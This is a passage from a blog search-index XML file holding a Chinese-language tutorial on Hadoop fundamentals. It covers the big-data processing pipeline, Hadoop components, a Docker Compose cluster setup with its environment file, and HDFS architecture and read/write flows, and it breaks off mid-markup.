<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Hadoop基础</title>
      <link href="/2025/06/13/Hadoop%E5%9F%BA%E7%A1%80/"/>
      <url>/2025/06/13/Hadoop%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h2 id="大数据处理流程"><a href="#大数据处理流程" class="headerlink" title="大数据处理流程"></a>大数据处理流程</h2><p>下图展现了大数据生态中设计的各种组件及工具。</p><p><img src="/2025/06/13/Hadoop%E5%9F%BA%E7%A1%80/1749194815478-80d0c7bb-3957-41a9-8f91-7d35235f8a65.png"></p><p>大数据处理的主要流程包括数据收集、数据存储、数据处理、数据应用等主要环节。</p><p><img src="/2025/06/13/Hadoop%E5%9F%BA%E7%A1%80/1749177801899-5ea62354-350e-4816-ba11-409899e3f432.png"></p><h3 id="数据采集"><a href="#数据采集" class="headerlink" title="数据采集"></a>数据采集</h3><p>在数据采集阶段，现有的中大型项目通常采用微服务架构进行分布式部署，所以数据采集需要在多台服务器上进行，且采集过程不能影响正常业务的开展。基于上述需求，就衍生了多种日志收集工具，如Flume、Logstash、Kibana等，它们都能通过简单的配置完成复杂的数据收集和数据聚合。</p><h3 id="数据存储"><a href="#数据存储" class="headerlink" title="数据存储"></a>数据存储</h3><p>在数据存储阶段，大家所熟知的例如MySQL、Oracle等传统的关系型数据库，其优点在于能够快速存储结构化的数据，并且支持随机访问，但大数据的数据结构通过是半结构化（如日志数据）、非结构化数据（如音频、视频数据），为了解决海量半结构化和非结构化数据的存储，Hadoop HDFS、KFS、GFS等分布式文件系统应运而生，它们都能够支持结构化、半结构和非结构化数据的存储，并可以通过增加机器进行横向扩展。</p><p>分布式文件系统完美地解决了海量数据存储的问题，但是一个优秀的数据存储系统需要同时考虑数据存储和访问两方面的问题，比如你希望能够对数据进行随机访问，这是传统的关系型数据库所擅长的，但却不是分布式文件系统所擅长的，那么有没有一种存储方案能够同时兼具分布式文件系统和关系型数据库的优点，基于这种需求，就产生了HBase、MongoDB。</p><h3 id="数据分析"><a href="#数据分析" class="headerlink" title="数据分析"></a>数据分析</h3><p>在数据分析阶段通常分为两种：批处理和流处理。</p><ul><li>批处理：对数据进行离线处理的方式，数据会按照一定的时间间隔或者数据量进行批量处理，对应的处理框架有Hadoop MapReduce、Spark、Flink等。批处理可以对大量数据进行高效处理和分析，适用于需要对历史数据进行分析和挖掘的场景，如离线数仓、批量报表、离线推荐等场景。</li></ul><p><img src="/2025/06/13/Hadoop%E5%9F%BA%E7%A1%80/1749193035965-615f41ba-cfde-4761-ba8f-6a427575d6d5.png"></p><ul><li>流处理：对数据进行实时处理的方式，数据会以流的形式不断地产生和处理，对应的处理框架有Storm、Spark Streaming、Flink Streaming等。流处理可以快速响应数据的变化，及时地进行数据处理和分析，适用于需要实时处理数据的场景，如实时数仓、实时监控、实时推荐等场景。</li></ul><p><img src="/2025/06/13/Hadoop%E5%9F%BA%E7%A1%80/1749192838450-df103e53-8497-40fe-b00b-b164479a16b8.png"></p><p>流处理和批处理都是常用的数据处理方式，它们各有优劣。流处理通常用于需要实时响应的场景，如在线监控和警报系统等；批处理则通常用于离线数据分析和挖掘等大规模数据处理场景。</p><p>同时，为了能够让熟悉SQL的人员也能够进行数据的分析，查询分析框架应运而生，常用的有Hive 、Spark SQL 、Flink SQL、Pig、Phoenix等。这些框架都能够使用标准的SQL或者类SQL语法灵活地进行数据的查询分析。这些SQL经过解析优化后转换为对应的作业程序来运行，如Hive本质上就是将SQL转换为MapReduce作业，Spark SQL将SQL转换为一系列的弹性分布式数据集（Resilient Distributed Dataset，RDD）和转换关系（Transformations），Phoenix将SQL查询转换为一个或多个HBase Scan。</p><h3 id="数据应用"><a href="#数据应用" class="headerlink" title="数据应用"></a>数据应用</h3><p>数据应用的领域广泛且多样，例如数据可视化广泛应用于科学研究、医疗健康、交通管理等领域，帮助专业人士更好地分析和理解数据；个性化推荐通过分析用户的行为数据、兴趣偏好等信息，为用户提供个性化的内容推荐，如短视频个性化推荐、电商商品推荐、头条新闻推荐等；数据也可以应用于机器学习模型训练，如金融领域，银行可以利用客户的历史交易数据训练机器学习模型，用于评估客户的信用风险，从而更好地进行信贷审批。</p><h2 id="Hadoop"><a href="#Hadoop" class="headerlink" title="Hadoop"></a>Hadoop</h2><h3 id="Hadoop起源"><a href="#Hadoop起源" class="headerlink" title="Hadoop起源"></a>Hadoop起源</h3><p>在大数据时代，针对大数据处理的新技术也在不断地开发和运用中，并逐渐成为数据处理挖掘行业广泛使用的主流技术。<strong>Hadoop作为处理大数据的分布式存储和计算框架</strong>，已在国内外大、中、小型企业中得到了广泛应用。</p><p>Hadoop是由Apache的Lucence项目创始人道格·卡廷创建的，Lucence是一个应用广泛的文本搜索系统库。Hadoop起源于开源的网络搜索引擎Nutch，Nutch本身也是Lucence项目的一部分，Hadoop的发展历史如下图所示。</p><p><img src="/2025/06/13/Hadoop%E5%9F%BA%E7%A1%80/1749196569009-239b14b7-4a0a-4aa1-a02f-e00bea675ba9.png"></p><h3 id="Hadoop核心组件"><a href="#Hadoop核心组件" class="headerlink" title="Hadoop核心组件"></a>Hadoop核心组件</h3><p>Hadoop的核心组件主要包括Hadoop Common、<strong>HDFS</strong>（Hadoop Distributed File System）、<strong>YARN</strong>（Yet Another Resource Negotiator）和<strong>MapReduce</strong>，这些组件共同构成了Hadoop的基础架构，提供了分布式存储和计算的能力。</p><ul><li>Hadoop Common提供库和工具，支持其他Hadoop模块运行，包括文件系统抽象、工具和库，用于访问文件系统，以及运行Hadoop的守护进程。</li><li>HDFS是Hadoop的分布式文件系统，用于存储数据。HDFS将大文件切分成多个数据块，并将这些数据块分布式地存储在集群的多个节点上，以提供高容错性和可扩展性。</li><li>YARN是Hadoop的资源管理器，负责集群资源的调度和管理。YARN将集群的计算资源划分为多个容器（Containers），并分配给不同的应用程序进行处理。</li><li>MapReduce是Hadoop的计算框架，用于分布式处理数据。MapReduce模型将计算任务分解为Map和Reduce两个阶段。Map阶段将输入数据划分为多个片段，并在集群的不同节点上并行处理；Reduce阶段将Map阶段的结果进行合并和汇总，生成最终的输出结果。</li></ul><h3 id="Hadoop环境搭建"><a href="#Hadoop环境搭建" class="headerlink" title="Hadoop环境搭建"></a>Hadoop环境搭建</h3><p>创建一个Hadoop的文件夹，结合配置docker-compose文件和hadoop.env文件，通过Docker Compose来部署一个Hadoop集群。</p><p>在docker-compose的配置中定义了5个服务：</p><ul><li>namenode：HDFS的NameNode，负责管理文件系统的元数据</li><li>datanode：HDFS的DataNode，负责存储实际的数据块</li><li>resourcemanager：YARN的ResourceManager，负责集群资源管理和任务调度</li><li>nodemanager：YARN的NodeManager，负责管理单个节点上的资源和任务</li><li>historyserver：YARN的HistoryServer，负责保存和展示已完成任务的历史信息</li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&quot;3&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">namenode:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">&quot;bde2020/hadoop-namenode:2.0.0-hadoop3.2.1-java8&quot;</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">&quot;namenode&quot;</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;hadoop-network&quot;</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">&quot;always&quot;</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;9870:9870&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;9000:9000&quot;</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;hadoop_namenode:/hadoop/dfs/name&quot;</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">CLUSTER_NAME:</span> <span class="string">&quot;docker-hadoop-cluster&quot;</span></span><br><span class="line">    <span class="attr">env_file:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;./hadoop.env&quot;</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">datanode:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">&quot;bde2020/hadoop-datanode:2.0.0-hadoop3.2.1-java8&quot;</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">&quot;datanode&quot;</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;hadoop-network&quot;</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">&quot;always&quot;</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;hadoop_datanode:/hadoop/dfs/data&quot;</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">SERVICE_PRECONDITION:</span> <span class="string">&quot;namenode:9870&quot;</span></span><br><span class="line">    <span class="attr">env_file:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;./hadoop.env&quot;</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">resourcemanager:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">&quot;bde2020/hadoop-resourcemanager:2.0.0-hadoop3.2.1-java8&quot;</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">&quot;resourcemanager&quot;</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;hadoop-network&quot;</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">&quot;always&quot;</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;8088:8088&quot;</span>  <span class="comment"># Web UI</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">SERVICE_PRECONDITION:</span> <span class="string">&quot;namenode:9000,namenode:9870,datanode:9864&quot;</span></span><br><span class="line">    <span class="attr">env_file:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;./hadoop.env&quot;</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">nodemanager:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">&quot;bde2020/hadoop-nodemanager:2.0.0-hadoop3.2.1-java8&quot;</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">&quot;nodemanager&quot;</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;hadoop-network&quot;</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">&quot;always&quot;</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">SERVICE_PRECONDITION:</span> <span class="string">&quot;namenode:9000,namenode:9870,datanode:9864,resourcemanager:8088&quot;</span></span><br><span class="line">    <span class="attr">env_file:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;./hadoop.env&quot;</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">historyserver:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">&quot;bde2020/hadoop-historyserver:2.0.0-hadoop3.2.1-java8&quot;</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">&quot;historyserver&quot;</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;hadoop-network&quot;</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">&quot;always&quot;</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;8188:8188&quot;</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">SERVICE_PRECONDITION:</span> <span class="string">&quot;namenode:9000,namenode:9870,datanode:9864,resourcemanager:8088&quot;</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;hadoop_historyserver:/hadoop/yarn/timeline&quot;</span></span><br><span class="line">    <span class="attr">env_file:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;./hadoop.env&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">volumes:</span></span><br><span class="line">  <span class="attr">hadoop_namenode:</span></span><br><span class="line">  <span class="attr">hadoop_datanode:</span></span><br><span class="line">  <span class="attr">hadoop_historyserver:</span></span><br><span class="line"></span><br><span class="line"><span class="attr">networks:</span></span><br><span class="line">  <span class="attr">hadoop-network:</span></span><br><span class="line">    <span class="attr">driver:</span> <span class="string">&quot;bridge&quot;</span></span><br><span class="line">    <span class="comment"># ipam:</span></span><br><span class="line">    <span class="comment">#   config:</span></span><br><span class="line">    <span class="comment">#     - subnet: &quot;172.23.0.0/24&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">CORE_CONF_fs_defaultFS=hdfs://namenode:9000</span><br><span class="line">CORE_CONF_hadoop_http_staticuser_user=root</span><br><span class="line">CORE_CONF_hadoop_proxyuser_hue_hosts=*</span><br><span class="line">CORE_CONF_hadoop_proxyuser_hue_groups=*</span><br><span class="line">CORE_CONF_io_compression_codecs=org.apache.hadoop.io.compress.SnappyCodec</span><br><span class="line"></span><br><span class="line">HDFS_CONF_dfs_webhdfs_enabled=true</span><br><span class="line">HDFS_CONF_dfs_permissions_enabled=false</span><br><span class="line">HDFS_CONF_dfs_namenode_datanode_registration_ip___hostname___check=false</span><br><span class="line"></span><br><span class="line">YARN_CONF_yarn_log___aggregation___enable=true</span><br><span class="line">YARN_CONF_yarn_log_server_url=http://historyserver:8188/applicationhistory/logs/</span><br><span class="line">YARN_CONF_yarn_resourcemanager_recovery_enabled=true</span><br><span class="line">YARN_CONF_yarn_resourcemanager_store_class=org.apache.hadoop.yarn.server.resourcemanager.recovery.FileSystemRMStateStore</span><br><span class="line">YARN_CONF_yarn_resourcemanager_scheduler_class=org.apache.hadoop.yarn.server.resourcemanager.scheduler.capacity.CapacityScheduler</span><br><span class="line">YARN_CONF_yarn_scheduler_capacity_root_default_maximum___allocation___mb=8192</span><br><span class="line">YARN_CONF_yarn_scheduler_capacity_root_default_maximum___allocation___mb=8192</span><br><span class="line">YARN_CONF_yarn_resourcemanager_fs_state___store_uri=/rmstate</span><br><span class="line">YARN_CONF_yarn_resourcemanager_system___metrics___publisher_enabled=true</span><br><span class="line">YARN_CONF_yarn_resourcemanager_hostname=resourcemanager</span><br><span class="line">YARN_CONF_yarn_resourcemanager_address=resourcemanager:8032</span><br><span class="line">YARN_CONF_yarn_resourcemanager_scheduler_address=resourcemanager:8030</span><br><span class="line">YARN_CONF_yarn_resourcemanager_resource__tracker_address=resourcemanager:8031</span><br><span class="line">YARN_CONF_yarn_timeline___service_enabled=true</span><br><span class="line">YARN_CONF_yarn_timeline___service_generic___application___history_enabled=true</span><br><span class="line">YARN_CONF_yarn_timeline___service_hostname=historyserver</span><br><span class="line">YARN_CONF_mapreduce_map_output_compress=true</span><br><span class="line">YARN_CONF_mapred_map_output_compress_codec=org.apache.hadoop.io.compress.SnappyCodec</span><br><span class="line">YARN_CONF_yarn_nodemanager_resource_memory___mb=16384</span><br><span class="line">YARN_CONF_yarn_nodemanager_resource_cpu___vcores=8</span><br><span class="line">YARN_CONF_yarn_nodemanager_disk___health___checker_max___disk___utilization___per___disk___percentage=98.5</span><br><span class="line">YARN_CONF_yarn_nodemanager_remote___app___log___dir=/app-logs</span><br><span class="line">YARN_CONF_yarn_nodemanager_aux___services=mapreduce_shuffle</span><br><span class="line"></span><br><span class="line">MAPRED_CONF_mapreduce_framework_name=yarn</span><br><span class="line">MAPRED_CONF_mapred_child_java_opts=-Xmx4096m</span><br><span class="line">MAPRED_CONF_mapreduce_map_memory_mb=4096</span><br><span class="line">MAPRED_CONF_mapreduce_reduce_memory_mb=8192</span><br><span class="line">MAPRED_CONF_mapreduce_map_java_opts=-Xmx3072m</span><br><span class="line">MAPRED_CONF_mapreduce_reduce_java_opts=-Xmx6144m</span><br><span class="line">MAPRED_CONF_yarn_app_mapreduce_am_env=HADOOP_MAPRED_HOME=/opt/hadoop-3.2.1/</span><br><span class="line">MAPRED_CONF_mapreduce_map_env=HADOOP_MAPRED_HOME=/opt/hadoop-3.2.1/</span><br><span class="line">MAPRED_CONF_mapreduce_reduce_env=HADOOP_MAPRED_HOME=/opt/hadoop-3.2.1/</span><br></pre></td></tr></table></figure><p>YARN作业测试，通过下面的命令提交一个示例MapReduce作业来进行验证，如果任务成功运行，在HistoryServer Web UI，可以看到一个运行完成状态的作业。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hadoop jar /opt/hadoop-3.2.1/share/hadoop/mapreduce/hadoop-mapreduce-examples-3.2.1.jar pi 10 100</span><br></pre></td></tr></table></figure><p><img src="/2025/06/13/Hadoop%E5%9F%BA%E7%A1%80/1749399941325-9da210be-8b83-480d-91c2-3c53fd435aa0.png"></p><h2 id="HDFS"><a href="#HDFS" class="headerlink" title="HDFS"></a>HDFS</h2><h3 id="HDFS设计原则"><a href="#HDFS设计原则" class="headerlink" title="HDFS设计原则"></a>HDFS设计原则</h3><h4 id="高容错性"><a href="#高容错性" class="headerlink" title="高容错性"></a>高容错性</h4><ol><li><strong><font style="color:rgba(0, 0, 0, 0.9);">数据冗余存储</font></strong><ul><li><font style="color:rgba(0, 0, 0, 0.9);">HDFS会将文件分割成多个数据块（block），默认情况下每个数据块会在集群中的不同节点上存储三份副本。例如，一个大小为256MB的文件，假设HDFS的块大小为128MB，那么这个文件会被分成两个块。这两个块各自在不同的数据节点上存储三份副本。这样即使某个数据节点出现故障，数据也不会丢失，因为还有其他副本可以使用。</font></li><li><font style="color:rgba(0, 0, 0, 0.9);">当检测到某个副本丢失（如数据节点故障或数据损坏）时，HDFS会自动重新复制数据块，以恢复到设定的副本数量。这种机制使得HDFS能够在硬件故障频繁的廉价硬件集群环境中可靠地存储数据。</font></li></ul></li><li><strong><font style="color:rgba(0, 0, 0, 0.9);">错误检测与恢复</font></strong><ul><li><font style="color:rgba(0, 0, 0, 0.9);">HDFS采用校验和（checksum）来检测数据块是否损坏。在写入数据块时，会计算校验和并存储。当读取数据块时，会再次计算校验和并与存储的校验和进行比较。如果发现校验和不一致，就认为该数据块损坏。此时，HDFS会从其他副本读取数据块，并且会尝试修复损坏的副本，通过重新复制未损坏的副本到原来存储损坏副本的节点或者新的节点。</font></li></ul></li></ol><h4 id="大规模数据集存储"><a href="#大规模数据集存储" class="headerlink" title="大规模数据集存储"></a><font style="color:rgba(0, 0, 0, 0.9);">大规模数据集存储</font></h4><ol><li><strong>大文件存储优化</strong><ul><li>HDFS针对大文件存储进行了优化。它采用大块（默认128MB）来存储数据，这比传统文件系统（如常见的4KB一块）更适合处理大规模数据集。对于大文件，大块可以减少元数据（如块的索引等信息）的管理开销。</li></ul></li><li><strong>高吞吐量访问</strong><ul><li>在设计上，HDFS更注重数据的吞吐量而不是低延迟。它适合于大规模数据的顺序读写操作。当进行大规模数据读取时，HDFS可以通过并行读取多个数据块来提高数据传输速率。例如，在进行数据挖掘或者大数据分析任务时，需要读取大量的数据，HDFS能够利用集群中的多个节点并行地读取数据块，从而实现高吞吐量的数据访问。</li></ul></li></ol><h4 id="简单一致性"><a href="#简单一致性" class="headerlink" title="简单一致性"></a>简单一致性</h4><ol><li><strong>一次写入多次读取</strong><ul><li>HDFS采用的是“一次写入，多次读取”的一致性模型。文件一旦被写入后，其内容是不可变的，只能追加数据。例如，在数据仓库场景中，数据一旦被加载到HDFS中，就可以被多个分析任务安全地读取，而不用担心数据在读取过程中被修改导致一致性问题。</li></ul></li><li><strong>命名空间一致性</strong><ul><li>HDFS的命名空间（包括文件和目录的层级结构）在集群范围内是一致的，所有的客户端看到的文件系统结构是相同的。</li></ul></li></ol><h4 id="流式数据访问"><a href="#流式数据访问" class="headerlink" title="流式数据访问"></a>流式数据访问</h4><ol><li><strong>数据本地性优化</strong><ul><li>HDFS会尽量将计算任务调度到存储数据的数据节点上执行，这就是数据本地性（data-locality）原则，以减少数据在网络中的传输，提高数据处理效率。例如，在运行MapReduce任务时，Hadoop会优先将map任务分配到存储输入数据块的节点上，如果无法在数据本地节点执行，也会尽量在同一个机架内的节点上执行，以减少跨机架的数据传输开销。</li></ul></li><li><strong>数据流失写入与读取</strong><ul><li>HDFS支持数据的流式写入和读取。对于写入操作，客户端可以像写入一个普通文件一样，连续不断地将数据写入HDFS。HDFS会将这些数据分块存储到集群中。在读取时，客户端也可以以流的方式读取数据块。这种流式访问方式非常适合于处理大规模数据，例如在日志数据收集系统中，日志数据可以源源不断地写入HDFS，后续的数据处理系统可以以流的方式读取这些日志数据进行分析。</li></ul></li></ol><h4 id="可移植性"><a href="#可移植性" class="headerlink" title="可移植性"></a>可移植性</h4><ol><li><strong>跨平台</strong><ul><li>HDFS是用Java语言编写的，因此它具有很好的可移植性。它可以运行在多种操作系统之上，如Linux、Unix和Windows等。</li></ul></li><li><strong>硬件兼容</strong><ul><li>HDFS被设计为可以在廉价的商用硬件上运行。它不需要高端的存储设备，能够充分利用普通的服务器硬件来构建大规模的存储集群。这种硬件兼容性使得企业可以以较低的成本构建HDFS集群，同时也可以方便地进行硬件扩展。</li></ul></li></ol><h3 id="HDFS架构"><a href="#HDFS架构" class="headerlink" title="HDFS架构"></a>HDFS架构</h3><p>HDFS采用master&#x2F;slave架构，一个HDFS集群是由一个Namenode和一定数目的Datanodes组成。</p><p>其中，Namenode是一个中心服务器，负责管理文件系统的命名空间（namespace）以及客户端对文件的访问；集群中的Datanode一般是一个节点一个，负责管理它所在节点上的存储。</p><p>HDFS暴露了文件系统的命名空间，用户能够以文件的形式在上面存储数据。从内部看，一个文件其实被分成一个或多个数据块，这些块存储在一组Datanode上，Namenode执行文件系统的命名空间操作，比如打开、关闭、重命名文件或目录，它也负责确定数据块到具体Datanode节点的映射；Datanode负责处理文件系统客户端的读写请求，在Namenode的统一调度下进行数据块的创建、删除和复制。</p><p><img src="/2025/06/13/Hadoop%E5%9F%BA%E7%A1%80/1749440954303-13a1515a-69a7-46ea-abbb-dbd838d746f9.png"></p><ul><li>Client：Client是HDFS的客户端，代表用户与HDFS交互，执行文件的读写操作。向NameNode发送文件读写请求，获取文件的元数据信息；根据NameNode返回的元数据信息，与DataNode进行实际的数据读写操作。</li><li>NameNode：NameNode是HDFS的主节点，负责管理文件系统的元数据。维护文件系统的目录树结构和文件的元数据，包括文件的权限、位置、大小等信息；管理数据块的分配和副本策略，确保每个数据块有足够数量的副本（默认3份）；处理客户端的文件读写请求，提供文件的元数据信息，指导客户端到相应的DataNode进行数据读写；监控DataNode的状态，通过心跳机制检测DataNode是否正常工作，管理集群的健康状态。</li><li>SecondaryNameNode：SecondaryNameNode是NameNode的辅助节点，主要用于协助NameNode进行元数据的检查点操作，防止元数据丢失。定期从NameNode获取fsimage和edit log文件，合并生成新的fsimage文件，作为元数据的备份；在NameNode故障时，可以提供最近的元数据备份，帮助快速恢复NameNode。</li><li>DataNode：DataNode是HDFS中的工作节点，负责存储和管理实际的数据块。DataNode存储文件的数据块，这些数据块是文件的物理存储单元；响应客户端的读写请求，从磁盘读取或写入数据块；定期向NameNode发送块报告（Block Report），报告其存储的数据块信息，以便NameNode更新元数据；根据NameNode的指令，创建、删除、复制数据块，以保证数据的冗余性和一致性。</li></ul><h3 id="HDFS读写"><a href="#HDFS读写" class="headerlink" title="HDFS读写"></a>HDFS读写</h3><p>作为一个文件系统，文件的读和写是最基本的需求，本部分了解客户端是如何与HDFS进行交互的，也就是客户端与HDFS，以及构成HDFS的两类节点（NameNode和DataNode）之间的数据流是怎样的。</p><ul><li>Block：是最大的单位，文件上传前需要分块，这个块就是Block，一般为128MB。一般不推荐修改块大小，因为块太小时寻址时间占比过高；块太大时Map任务数太少，作业执行速度变慢。</li><li>Packet：是第二大的单位，它是Client向DataNode，或DataNode之间数据传输的基本单位，默认64KB。</li><li>Chunk：是最小的单位，它是Client向DataNode，或DataNode之间进行数据校验的基本单位，默认512Byte。因为用作校验，故每个Chunk需要带有4Byte的校验位，所以实际每个Chunk写入Packet的大小为516Byte。</li></ul><h4 id="HDFS写数据流程"><a href="#HDFS写数据流程" class="headerlink" title="HDFS写数据流程"></a>HDFS写数据流程</h4><ol><li>客户端通过Distributed FileSystem模块向NameNode请求上传文件，NameNode检查目标文件是否已存在，父目录是否存在；</li><li>NameNode返回是否可以上传；</li><li>客户端请求第一个Block上传到哪几个DataNode服务器上；</li><li>NameNode依据<strong>机架感知策略</strong>（默认副本数为3）返回节点，例如DataNode1、DataNode2、DataNode3；</li><li>客户端通过FSDataOutputStream模块请求DataNode1上传数据，DataNode1收到请求会继续调用DataNode2，然后DataNode2调用DataNode3，形成传输管道（Pipeline）；</li><li>DataNode1、DataNode2、DataNode3逐级应答客户端；</li><li>客户端开始往DataNode1上传第一个Block（先从磁盘读取数据放到一个本地内存缓存），以Packet为单位，DataNode1收到一个Packet就会传给DataNode2，DataNode2传给DataNode3，每个节点接收Packet后会写入本地磁盘并加入应答队列；</li><li>当一个Block传输完成之后，客户端再次请求NameNode上传第二个Block的服务器。（重复执行3-7步）；</li><li>直至所有块上传完毕，最终客户端通知NameNode完成上传，NameNode更新元数据（如FsImage和EditLog）。</li></ol><p><img src="/2025/06/13/Hadoop%E5%9F%BA%E7%A1%80/1749482394334-46f86b14-083a-49c3-b573-6e52a586659c.png"></p><h4 id="HDFS读数据流程"><a href="#HDFS读数据流程" class="headerlink" title="HDFS读数据流程"></a>HDFS读数据流程</h4><ol><li>客户端通过DistributedFileSystem向NameNode请求下载文件，NameNode通过查询元数据，找到文件块所在的DataNode地址；</li><li>挑选一台DataNode（就近原则，然后随机）服务器，请求读取数据；</li><li>DataNode开始传输数据给客户端（从磁盘里面读取数据输入流，以Packet为单位来做校验）；</li><li>客户端以Packet为单位接收，先在本地缓存，然后写入目标文件。</li></ol><p><img src="/2025/06/13/Hadoop%E5%9F%BA%E7%A1%80/1749482510802-87148d2b-f368-451b-aaed-b79e8deacbda.png"></p><h4 id="DFSOutputStream内部原理"><a href="#DFSOutputStream内部原理" class="headerlink" 